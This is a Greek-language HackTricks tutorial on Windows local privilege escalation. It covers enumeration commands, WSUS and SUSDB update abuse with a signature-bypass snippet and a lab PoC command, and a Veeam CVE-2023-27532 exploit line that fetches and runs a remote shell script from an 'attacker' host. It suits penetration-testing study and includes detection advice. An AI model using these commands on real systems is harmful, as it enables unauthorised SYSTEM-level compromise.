# Κλιμάκωση τοπικών προνομίων στα Windows

{{#include ../../banners/hacktricks-training.md}}

### **Καλύτερο εργαλείο για την αναζήτηση διανυσμάτων κλιμάκωσης τοπικών προνομίων στα Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Αυτή η σελίδα συγκεντρώνει γενικές μεθοδολογίες κλιμάκωσης προνομίων στα Windows από αρκετούς βασικούς οδηγούς.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Η πρακτική ροή enumeration βασίζεται επίσης σε εργαστήρια και λίστες ελέγχου της κοινότητας.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Το ιστορικό υλικό επιθέσεων περιλαμβάνει την παρουσίαση του DerbyCon για την κλιμάκωση προνομίων στα Windows.<sup>[[5]](#references)</sup>

## Βασικές έννοιες των Windows

### Access Tokens

**Αν δεν γνωρίζετε τι είναι τα access tokens των Windows, διαβάστε την ακόλουθη σελίδα πριν συνεχίσετε:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Για περισσότερες πληροφορίες σχετικά με τα ACLs - DACLs/SACLs/ACEs, δείτε την ακόλουθη σελίδα:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Επίπεδα ακεραιότητας

**Αν δεν γνωρίζετε τι είναι τα επίπεδα ακεραιότητας στα Windows, διαβάστε την ακόλουθη σελίδα πριν συνεχίσετε:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Μηχανισμοί ασφάλειας των Windows

Υπάρχουν διάφορα πράγματα στα Windows που θα μπορούσαν να **εμποδίσουν το enumeration του συστήματος**, την εκτέλεση εκτελέσιμων αρχείων ή ακόμη και να **εντοπίσουν τις δραστηριότητές σας**. Πριν ξεκινήσετε το enumeration για κλιμάκωση προνομίων, θα πρέπει να **διαβάσετε** την ακόλουθη **σελίδα** και να κάνετε **enumeration** όλων αυτών των **μηχανισμών άμυνας**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Η φυσική πρόσβαση μπορεί επίσης να μετατρέψει μια offline επεξεργασία του UEFI NVRAM σε αλυσίδα DMA πριν από την εκκίνηση και τροποποίησης μνήμης των Windows `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Προστασία διαχειριστή / αθόρυβη ανύψωση δικαιωμάτων μέσω UIAccess

Οι διεργασίες UIAccess που εκκινούνται μέσω του `RAiLaunchAdminProcess` μπορούν να αξιοποιηθούν για πρόσβαση σε High IL χωρίς προτροπές, όταν παρακάμπτονται οι έλεγχοι ασφαλούς διαδρομής του AppInfo. Δείτε εδώ την ειδική ροή παράκαμψης UIAccess/Admin Protection:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Η διάδοση ρυθμίσεων μητρώου προσβασιμότητας του Secure Desktop μπορεί να αξιοποιηθεί για αυθαίρετη εγγραφή στο μητρώο ως SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Οι πρόσφατες εκδόσεις των Windows εισήγαγαν επίσης ένα μονοπάτι LPE μέσω **SMB αυθαίρετης θύρας**, όπου γίνεται ανακλώμενος έλεγχος ταυτότητας NTLM από προνομιούχο τοπικό χρήστη μέσω μιας επαναχρησιμοποιημένης σύνδεσης SMB TCP:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Πληροφορίες συστήματος

### Enumeration πληροφοριών έκδοσης

Ελέγξτε αν η έκδοση των Windows έχει γνωστές ευπάθειες (ελέγξτε επίσης τις εγκατεστημένες ενημερώσεις κώδικα).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Exploits ανά έκδοση

Αυτός ο [ιστότοπος](https://msrc.microsoft.com/update-guide/vulnerability) είναι χρήσιμος για την αναζήτηση λεπτομερών πληροφοριών σχετικά με ευπάθειες ασφαλείας της Microsoft. Αυτή η βάση δεδομένων περιλαμβάνει περισσότερες από 4.700 ευπάθειες ασφαλείας, αναδεικνύοντας την **τεράστια επιφάνεια επίθεσης** που παρουσιάζει ένα περιβάλλον Windows.

**Στο σύστημα**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — καταγράφει το build του OS, τις εγκατεστημένες ενημερώσεις και πιθανά σχετικά advisories· επαληθεύστε το ακριβές προϊόν και τις νεότερες ενημερώσεις που αντικαθιστούν προηγούμενες, πριν θεωρήσετε ότι ένα αποτέλεσμα εφαρμόζεται.

Για ένα local exploit που αφορά συγκεκριμένη έκδοση, ελέγξτε την **αρχιτεκτονική της διεργασίας που εκτελείται**, καθώς και την αρχιτεκτονική του OS. Στα Windows 64-bit, μια διεργασία 32-bit υπόκειται σε [ανακατεύθυνση συστήματος αρχείων WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): η διαδρομή `%windir%\System32` συνήθως οδηγεί στον κατάλογο συστήματος 32-bit, ενώ η `%windir%\Sysnative` παρέχει σε αυτή τη διεργασία πρόσβαση στον εγγενή κατάλογο συστήματος. Το alias δεν είναι διαθέσιμο σε διεργασία 64-bit. Το build του OS ή η πιθανότητα απουσίας κάποιου KB δεν αποδεικνύουν ότι το σύστημα είναι ευάλωτο σε exploit· συγκρίνετε το build που εκτελείται, την εγκατεστημένη ενημέρωση ή κάποια νεότερη ενημέρωση που την αντικαθιστά, την αρχιτεκτονική της διεργασίας και τις προϋποθέσεις του exploit με το [δελτίο ασφαλείας της Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) για το συγκεκριμένο ζήτημα.

**Τοπικά, με πληροφορίες συστήματος**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**GitHub repos με exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Περιβάλλον

Υπάρχουν διαπιστευτήρια ή άλλες χρήσιμες πληροφορίες αποθηκευμένες στις μεταβλητές περιβάλλοντος;

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Ιστορικό PowerShell

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### Αρχεία Transcript του PowerShell

Μπορείτε να μάθετε πώς να το ενεργοποιήσετε στο [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` είναι απλώς ένα παράδειγμα. [PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) συνήθως αποθηκεύει αρχεία στον φάκελο Documents κάθε χρήστη, αλλά μια ρύθμιση `OutputDirectory` ή η εντολή `Start-Transcript -OutputDirectory` μπορεί να ανακατευθύνει τα αρχεία σε κοινόχρηστο ή κρυφό φάκελο. Ελέγξτε την ενεργή διαδρομή εξόδου και τα ACL του αρχείου προτού εξετάσετε ένα transcript: μπορεί να περιέχει ορίσματα εντολών και έξοδο, συμπεριλαμβανομένων διαπιστευτηρίων. Ένα αναγνώσιμο transcript αποτελεί μόνο ένδειξη, εκτός αν το περιεχόμενό του αποκαλύπτει μια αξιοποιήσιμη ταυτότητα με υψηλότερα προνόμια και η συγκεκριμένη ταυτότητα μπορεί να συνδεθεί στο σχετικό περιβάλλον.

### PowerShell Module Logging

Καταγράφονται λεπτομέρειες των εκτελέσεων του PowerShell pipeline, όπως εντολές που εκτελέστηκαν, κλήσεις εντολών και τμήματα scripts. Ωστόσο, ενδέχεται να μην καταγράφονται όλες οι λεπτομέρειες της εκτέλεσης και τα αποτελέσματα εξόδου.

Για να το ενεργοποιήσετε, ακολουθήστε τις οδηγίες της ενότητας "Transcript files" στην τεκμηρίωση, επιλέγοντας **"Module Logging"** αντί για **"Powershell Transcription"**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Για να δείτε τα τελευταία 15 συμβάντα από τα logs του PowersShell, μπορείτε να εκτελέσετε:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Καταγράφεται πλήρως η δραστηριότητα και το περιεχόμενο της εκτέλεσης του script, διασφαλίζοντας ότι κάθε μπλοκ κώδικα τεκμηριώνεται καθώς εκτελείται. Αυτή η διαδικασία διατηρεί ένα ολοκληρωμένο ίχνος ελέγχου κάθε δραστηριότητας, χρήσιμο για την εγκληματολογική ανάλυση και την εξέταση κακόβουλης συμπεριφοράς. Η τεκμηρίωση όλης της δραστηριότητας κατά την εκτέλεση παρέχει λεπτομερείς πληροφορίες για τη διαδικασία.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Τα συμβάντα καταγραφής για το Script Block βρίσκονται στο Windows Event Viewer, στη διαδρομή: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Για να δείτε τα 20 πιο πρόσφατα συμβάντα, μπορείτε να χρησιμοποιήσετε:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Ρυθμίσεις Internet

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Δίσκοι

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Ένα endpoint WSUS μέσω HTTP αποτελεί ένδειξη για διερεύνηση πιθανής υποκλοπής των μεταδεδομένων ενημερώσεων. Η εκμετάλλευση εξαρτάται επίσης από το αν ο client χρησιμοποιεί αυτόν τον WSUS server, αν ένας attacker μπορεί να υποκλέψει ή να ελέγξει την κίνησή του και από τις πολιτικές εμπιστοσύνης και εγκατάστασης ενημερώσεων του client. Το URL από μόνο του δεν συνεπάγεται εκτέλεση κώδικα. [Η Microsoft συνιστά τη χρήση TLS για τα μεταδεδομένα WSUS](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Ξεκινάτε ελέγχοντας αν το δίκτυο χρησιμοποιεί ενημέρωση WSUS χωρίς SSL, εκτελώντας την παρακάτω εντολή στο cmd:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Ή το παρακάτω σε PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Αν λάβεις μια απάντηση όπως κάποια από αυτές:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Και αν το `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ή το `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` είναι ίσο με `1`.

Όταν το `UseWUServer` είναι `1`, το Windows Update χρησιμοποιεί την ρυθμισμένη υπηρεσία intranet. Αυτό επιβεβαιώνει μια προϋπόθεση για τη διαδρομή υποκλοπής HTTP, αλλά δεν αποδεικνύει ότι είναι δυνατή η υποκλοπή, η αποδοχή κακόβουλων ενημερώσεων ή η εγκατάσταση με αυξημένα δικαιώματα. Όταν είναι `0`, αυτό το συγκεκριμένο ρυθμισμένο WSUS endpoint δεν επιλέγεται από αυτήν την πολιτική.

Για να εκμεταλλευτείτε αυτές τις ευπάθειες, μπορείτε να χρησιμοποιήσετε εργαλεία όπως: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Πρόκειται για weaponized exploit scripts MiTM που εισάγουν «ψεύτικες» ενημερώσεις στην κίνηση WSUS χωρίς SSL.

Διαβάστε εδώ την έρευνα:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Διαβάστε εδώ την πλήρη αναφορά**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Βασικά, αυτό είναι το ελάττωμα που εκμεταλλεύεται αυτό το bug:

> Αν έχουμε τη δυνατότητα να τροποποιήσουμε τον τοπικό proxy του χρήστη μας και το Windows Updates χρησιμοποιεί τον proxy που έχει ρυθμιστεί στις ρυθμίσεις του Internet Explorer, τότε έχουμε τη δυνατότητα να εκτελέσουμε το [PyWSUS](https://github.com/GoSecure/pywsus) τοπικά, ώστε να υποκλέψουμε τη δική μας κίνηση και να εκτελέσουμε κώδικα ως χρήστης με αυξημένα δικαιώματα στο σύστημά μας.
>
> Επιπλέον, καθώς η υπηρεσία WSUS χρησιμοποιεί τις ρυθμίσεις του τρέχοντος χρήστη, χρησιμοποιεί και το certificate store του. Αν δημιουργήσουμε ένα self-signed certificate για το hostname του WSUS και προσθέσουμε αυτό το certificate στο certificate store του τρέχοντος χρήστη, θα μπορούμε να υποκλέψουμε τόσο HTTP όσο και HTTPS κίνηση WSUS. Το WSUS δεν χρησιμοποιεί μηχανισμούς τύπου HSTS για να εφαρμόσει επικύρωση εμπιστοσύνης τύπου trust-on-first-use στο certificate. Αν το certificate που παρουσιάζεται είναι έμπιστο για τον χρήστη και έχει το σωστό hostname, θα γίνει αποδεκτό από την υπηρεσία.

Μπορείτε να εκμεταλλευτείτε αυτήν την ευπάθεια χρησιμοποιώντας το εργαλείο [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (μόλις κυκλοφορήσει).

### Ενημερώσεις WSUS που ελέγχονται από διαχειριστή

Υπάρχει ξεχωριστή διαδρομή όταν η τρέχουσα ταυτότητα μπορεί να **δημοσιεύει και να εγκρίνει** ενημερώσεις σε έναν WSUS server. Ελέγξτε την πραγματική συμμετοχή στην ομάδα `WSUS Administrators` του server και τυχόν εκχωρημένα δικαιώματα WSUS και, στη συνέχεια, εντοπίστε την ομάδα υπολογιστών-πελατών που θα λάβει μια εγκεκριμένη ενημέρωση. Η [Microsoft απαιτεί δικαιώματα WSUS Administrator για την έγκριση ενημερώσεων](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) και [τεκμηριώνει τη σχέση εμπιστοσύνης δημοσίευσης](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): οι clients πρέπει να εμπιστεύονται το signing certificate που χρησιμοποιείται για τοπικά δημοσιευμένο περιεχόμενο. Επιβεβαιώστε ότι η υποψήφια ενημέρωση είναι υπογεγραμμένη και γίνεται αποδεκτή, εφαρμόζεται στον στόχο και εγκαθίσταται σε περιβάλλον με αυξημένα δικαιώματα, προτού θεωρήσετε ότι πρόκειται για διαδρομή κλιμάκωσης δικαιωμάτων. Μια τιμή HTTP `WUServer` ή ένα όνομα ομάδας από μόνα τους δεν αποδεικνύουν ότι ισχύουν αυτές οι συνθήκες.

### Κατάχρηση προσαρμοσμένων ενημερώσεων SUSDB: unsigned payloads μέσω `.txt`/`.esd`

Πρόκειται για διαφορετική αστοχία ορίου εμπιστοσύνης από την υποκλοπή μιας σύνδεσης HTTP WSUS: προϋπόθεση είναι να έχετε αρκετή πρόσβαση στις **stored procedures της βάσης δεδομένων WSUS (`SUSDB`)**, ώστε να δημοσιεύσετε και να εγκρίνετε μια προσαρμοσμένη ενημέρωση. Ένας πρακτικός τρόπος εισόδου είναι η αναμετάδοση ενός λογαριασμού υπολογιστή upstream WSUS σε ξεχωριστό MSSQL server που φιλοξενεί τη `SUSDB`· η ακριβής προϋπόθεση εξαρτάται από την εγκατάσταση, επομένως πρώτα καταγράψτε τα δικαιώματα `EXECUTE` αντί να υποθέσετε ότι απαιτούνται δικαιώματα SQL administrator.<sup>[[38]](#references)[[39]](#references)</sup>

Για την ξεχωριστή διαδρομή επίθεσης που αναμεταδίδει τον έλεγχο ταυτότητας WSUS client από HTTP/8530 σε LDAP, SMB ή AD CS, δείτε την ενότητα [Κατάχρηση HTTP WSUS για NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Δημιουργία, στόχευση και έγκριση της ενημέρωσης

Η ροή εργασίας προσαρμοσμένων ενημερώσεων χρησιμοποιεί τις νόμιμες διαδικασίες WSUS ως περιορισμένο API δημοσίευσης. Οι σημαντικές μεταβάσεις κατάστασης είναι οι εξής:<sup>[[38]](#references)</sup>

| Στάδιο | Σχετικές stored procedures |
| --- | --- |
| Εισαγωγή metadata ενημέρωσης | `spImportUpdate` |
| Αποθήκευση XML fragments προαπαιτούμενων, τοπικών ρυθμίσεων και επεκτάσεων | `spSaveXMLFragment` |
| Συσχέτιση του digest περιεχομένου με το URL που ελέγχεται από τον επιτιθέμενο | `spSetBatchURL` |
| Καταγραφή/δημιουργία ομάδας υπολογιστών και προσθήκη του client | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Έγκριση εγκατάστασης για αυτήν την ομάδα | `spDeployUpdate` με `@actionID = 0` και `@isAssigned = 1` |

Το όνομα αρχείου, τα digests, το μέγεθος και ο handler `CommandLineInstallation` πρέπει να συμφωνούν σε όλο το metadata/fragments που έχουν εισαχθεί. Αφού ορίσετε το URL περιεχομένου και την ομάδα-στόχο, η τελική έγκριση έχει περίπου την εξής μορφή· χρησιμοποιήστε νέα αναγνωριστικά ενημέρωσης, ομάδας και ανάπτυξης αντί να επαναχρησιμοποιήσετε GUID από παραδείγματα.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Παράκαμψη signature μέσω επέκτασης

Το WSUS συνήθως απορρίπτει αυθαίρετο μη υπογεγραμμένο εκτελέσιμο περιεχόμενο. Ωστόσο, στο `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, η διαδρομή `.NET` `VerifyFile` ορίζει τη σημαία ελέγχου πιστοποιητικού σε false όταν το παρεχόμενο όνομα αρχείου τελειώνει σε `.txt` ή `.esd`. Έτσι, παραλείπεται το `CheckCertificateSignature` χωρίς να έχει προηγουμένως επιβεβαιωθεί ότι τα bytes είναι κείμενο ή έγκυρη εικόνα ESD. Επομένως, ένα αμετάβλητο PE με όνομα, για παράδειγμα, `payload.exe.txt` μπορεί να περάσει την επαλήθευση περιεχομένου και στη συνέχεια να εκκινηθεί από τον handler εγκατάστασης της ενημέρωσης μέσω command line. Πρόκειται για σφάλμα σύγχυσης πολιτικής/τύπου και όχι για πλαστογράφηση υπογραφής.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Staging συμβατό με BITS και αυτοματοποίηση

Η κλήση του `spDeployUpdate` κάνει το WSUS να ανακτήσει το καταχωρισμένο περιεχόμενο. Ο origin πρέπει να ικανοποιεί τις απαιτήσεις HTTP του BITS: δεν αρκεί μόνο να είναι προσβάσιμο το URL, καθώς η μεταφορά χρησιμοποιεί αρχική ροή `HEAD`/`GET` και αιτήματα byte-range. Ένας server χωρίς υποστήριξη Range προκαλεί το συμβάν συγχρονισμού WSUS `EventId=364`, το οποίο αναφέρει ότι το BITS απαιτεί την κεφαλίδα πρωτοκόλλου Range.<sup>[[39]](#references)</sup>

Το ερευνητικό PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) δημιουργεί το SQL που απαιτείται για την αλυσίδα import/fragment/URL/group/deployment, περιλαμβάνει έναν τροποποιημένο client MSSQL για την εκτέλεσή του και παρέχει το `BitsWebServer.py` για το staging του περιεχομένου. Μια ελάχιστη εντολή για εξουσιοδοτημένο lab είναι:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Μη επιτηρούμενη εκτέλεση και persistence μέσω επαναλήψεων

Η αλληλεπίδραση από την πλευρά του client εξαρτάται από την πολιτική. Η επιλογή `4 - Auto download and schedule install` στη διαδρομή `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` επιτρέπει τη λήψη και εγκατάσταση μιας εγκεκριμένης ενημέρωσης σύμφωνα με το ρυθμισμένο πρόγραμμα, χωρίς να χρειάζεται να την επιλέξει χειροκίνητα ο χρήστης. Κατά τις δοκιμές, ένα payload του οποίου η ενημέρωση παρέμενε σε κατάσταση αποτυχίας/μη ολοκλήρωσης προσφερόταν ξανά αμέσως μόλις τερματιζόταν η διεργασία callback, επομένως η συμπεριφορά επανάληψης μπορεί να οδηγήσει σε recurring execution persistence· είναι θορυβώδης, καθώς ο client εμφανίζει κατάσταση αποτυχίας ενημέρωσης.<sup>[[39]](#references)</sup>

#### Σημεία εστίασης για detection και hardening

Χρήσιμα σημεία εστίασης σε server και client από αυτή την αλυσίδα είναι τα εξής:<sup>[[39]](#references)</sup>

- Ελέγξτε την εκτέλεση των `spCreateTargetGroup`, `spSetBatchURL` και `spDeployUpdate` στο `SUSDB`. Διερευνήστε νέες targeting groups, εξωτερικές πηγές περιεχομένου, payload ενημερώσεων `.txt`/`.esd` και deployments από μη αναμενόμενα principals (ειδικά λογαριασμούς που δεν είναι υπολογιστές).
- Ελέγξτε το `C:\Program Files\Update Services\LogFiles` για `ContentSyncAgent`, `FileVerified`, το ανορθόγραφο `FileVerficationFailed` και `EventId=364`. Συσχετίστε την επαλήθευση με την επέκταση του payload και το magic bytes του περιεχομένου, αντί να εμπιστεύεστε την κατάληξη.
- Αναζητήστε περιπτώσεις όπου η εγκατάσταση του Windows Update αποτυγχάνει επανειλημμένα ή δοκιμάζεται ξανά, καθώς και εκτέλεση PE ή μη αναμενόμενη δραστηριότητα child process/δικτύου από περιεχόμενο με ονόματα `.txt` ή `.esd`.
- Όπου υποστηρίζεται, απαιτήστε Extended Protection for Authentication στην υπηρεσία βάσης δεδομένων και περιορίστε την πρόσβαση της βάσης δεδομένων μέσω δικτύου στον server WSUS και σε εξουσιοδοτημένα συστήματα διαχείρισης. Περιορίστε στο ελάχιστο και ελέγξτε τα δικαιώματα `EXECUTE` στις διαδικασίες custom-update.

## Εργαλεία αυτόματης ενημέρωσης τρίτων και Agent IPC (local privesc)

Πολλοί enterprise agents εκθέτουν μια επιφάνεια IPC στο localhost και ένα κανάλι ενημέρωσης με elevated privileges. Αν η διαδικασία enrollment μπορεί να εξαναγκαστεί να επικοινωνήσει με server του attacker και το updater εμπιστεύεται μια rogue root CA ή έχει αδύναμους ελέγχους υπογραφής, ένας τοπικός χρήστης μπορεί να παραδώσει ένα κακόβουλο MSI που θα εγκαταστήσει η υπηρεσία SYSTEM. Δείτε εδώ μια γενικευμένη τεχνική (βασισμένη στην αλυσίδα Netskope stAgentSvc – CVE-2025-0309):


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM μέσω TCP 9401)

Το Veeam Backup & Replication και το Cloud Connect χρησιμοποιούν μια βασική υπηρεσία backup, η οποία ακούει στο **TCP/9401 από προεπιλογή**. Η [συμβουλευτική ανακοίνωση της Veeam](https://www.veeam.com/kb4424) περιγράφει μη αυθεντικοποιημένη αποκάλυψη διαπιστευτηρίων κρυπτογραφημένης βάσης δεδομένων ρυθμίσεων εντός της περιμέτρου του δικτύου backup· ένα ξεχωριστό δημόσιο PoC επιδεικνύει μια διαδρομή command execution ως **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Η υπηρεσία μπορεί να κάνει bind σε διεύθυνση πέρα από το localhost, επομένως ελέγξτε την πραγματική της διεύθυνση και το PID.

- **Recon**: επιβεβαιώστε ότι το TCP/9401 ανήκει στο `Veeam.Backup.Service.exe` και, στη συνέχεια, εξετάστε το εγκατεστημένο προϊόν και τα patch metadata. Τα `netstat -ano | findstr 9401` και `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` είναι ενδείξεις, όχι πλήρης έλεγχος για patches.
- **Ελάχιστες σταθερές εκδόσεις**: η Veeam αναφέρει τα **11a build 11.0.1.1261 P20230227** και **12 build 12.0.0.1420 P20230223** ως τις πρώτες εκδόσεις που περιλαμβάνουν την επιδιόρθωση· οι παλαιότερες εκδόσεις επηρεάζονται. Μια τετραμερής έκδοση αρχείου από μόνη της δεν αρκεί για να διακρίνει ένα μη ενημερωμένο base build από ένα μεταγενέστερο patch με τους ίδιους αριθμούς build. Πριν χαρακτηρίσετε ένα οριακό build ως διορθωμένο, επαληθεύστε το patch identifier στο [ιστορικό build του κατασκευαστή](https://www.veeam.com/kb2680).
- **Exploit**: τοποθετήστε ένα PoC όπως το `VeeamHax.exe` μαζί με τα απαιτούμενα Veeam DLLs στον ίδιο κατάλογο και, στη συνέχεια, ενεργοποιήστε ένα payload SYSTEM μέσω του local socket:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Το PoC που παρατίθεται επιδεικνύει εκτέλεση εντολών ως SYSTEM όταν ισχύουν οι πρόσθετες προϋποθέσεις του· η συμβουλευτική ανακοίνωση του προμηθευτή περιγράφει το ζήτημα αποκάλυψης διαπιστευτηρίων.
## KrbRelayUp

Ένα τοπικό Kerberos relay μπορεί να μετατρέψει μια σύνδεση με χαμηλότερα προνόμια σε εγγραφή στον κατάλογο με αυξημένα προνόμια, όταν ένας κατάλληλος COM server πραγματοποιεί authentication και το relayed principal έχει δικαιώματα στο αντικείμενο-στόχο. Το [KrbRelay](https://github.com/cube0x0/KrbRelay) τεκμηριώνει εγγραφές LDAP μέσω RBCD και `msDS-KeyCredentialLink` (shadow-credential)· το KrbRelayUp αυτοματοποιεί ορισμένες από αυτές τις διαδρομές. Μια αλυσίδα RBCD απαιτεί κατάλληλα δικαιώματα delegation και στο αντικείμενο-στόχο, ενώ μια αλυσίδα shadow-credential απαιτεί δικαιώματα εγγραφής key-credential και KDC που υποστηρίζει τη διαδρομή certificate authentication. Καμία από τις δύο διαδρομές δεν προκύπτει μόνο από τη συμμετοχή στον τομέα.

